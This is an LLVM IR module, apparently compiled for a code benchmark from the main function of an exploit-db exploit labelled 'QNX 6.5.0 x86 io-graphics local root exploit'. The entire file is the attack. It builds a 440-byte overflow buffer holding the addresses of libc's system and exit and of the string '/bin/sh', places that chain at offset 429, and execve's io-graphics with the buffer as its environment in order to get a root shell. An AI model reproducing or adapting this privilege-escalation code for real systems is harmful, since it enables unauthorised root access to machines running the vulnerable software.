; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/qnx/local/extr_32154.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/qnx/local/extr_32154.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [28 x i8] c"/usr/photon/bin/io-graphics\00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c"io-graphics\00", align 1
@__const.main.prog = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i32 0, i32 0), i8* null], align 16
@.str.2 = private unnamed_addr constant [64 x i8] c"QNX 6.5.0 x86 io-graphics local root exploit by cenobyte 2013\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"system\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@VULN = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [440 x i8], align 16
  %7 = alloca [3 x i8*], align 16
  %8 = alloca [2 x i8*], align 16
  store i32 0, i32* %1, align 4
  store i32 429, i32* %2, align 4
  %9 = bitcast [3 x i8*]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %9, i8* align 16 bitcast ([3 x i8*]* @__const.main.prog to i8*), i64 24, i1 false)
  %10 = getelementptr inbounds [2 x i8*], [2 x i8*]* %8, i64 0, i64 0
  %11 = getelementptr inbounds [440 x i8], [440 x i8]* %6, i64 0, i64 0
  store i8* %11, i8** %10, align 8
  %12 = getelementptr inbounds i8*, i8** %10, i64 1
  store i8* null, i8** %12, align 8
  %13 = call i32 @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.2, i64 0, i64 0))
  %14 = call i32 @find_libc(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  store i32 %14, i32* %3, align 4
  %15 = call i32 @find_libc(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  store i32 %15, i32* %4, align 4
  %16 = call i32 @find_string(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  store i32 %16, i32* %5, align 4
  %17 = getelementptr inbounds [440 x i8], [440 x i8]* %6, i64 0, i64 0
  %18 = call i32 @memset(i8* %17, i32 235, i32 440)
  %19 = getelementptr inbounds [440 x i8], [440 x i8]* %6, i64 0, i64 0
  %20 = load i8*, i8** @VULN, align 8
  %21 = load i8*, i8** @VULN, align 8
  %22 = call i32 @strlen(i8* %21)
  %23 = call i32 @memcpy(i8* %19, i8* %20, i32 %22)
  %24 = getelementptr inbounds [440 x i8], [440 x i8]* %6, i64 0, i64 0
  %25 = load i32, i32* %2, align 4
  %26 = zext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = bitcast i32* %3 to i8*
  %29 = call i32 @memcpy(i8* %27, i8* %28, i32 4)
  %30 = getelementptr inbounds [440 x i8], [440 x i8]* %6, i64 0, i64 0
  %31 = load i32, i32* %2, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = getelementptr inbounds i8, i8* %33, i64 4
  %35 = bitcast i32* %4 to i8*
  %36 = call i32 @memcpy(i8* %34, i8* %35, i32 4)
  %37 = getelementptr inbounds [440 x i8], [440 x i8]* %6, i64 0, i64 0
  %38 = load i32, i32* %2, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  %41 = getelementptr inbounds i8, i8* %40, i64 8
  %42 = bitcast i32* %5 to i8*
  %43 = call i32 @memcpy(i8* %41, i8* %42, i32 4)
  %44 = getelementptr inbounds [3 x i8*], [3 x i8*]* %7, i64 0, i64 0
  %45 = load i8*, i8** %44, align 16
  %46 = getelementptr inbounds [3 x i8*], [3 x i8*]* %7, i64 0, i64 0
  %47 = getelementptr inbounds [2 x i8*], [2 x i8*]* %8, i64 0, i64 0
  %48 = call i32 @execve(i8* %45, i8** %46, i8** %47)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @find_libc(i8*) #2

declare dso_local i32 @find_string(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @execve(i8*, i8**, i8**) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
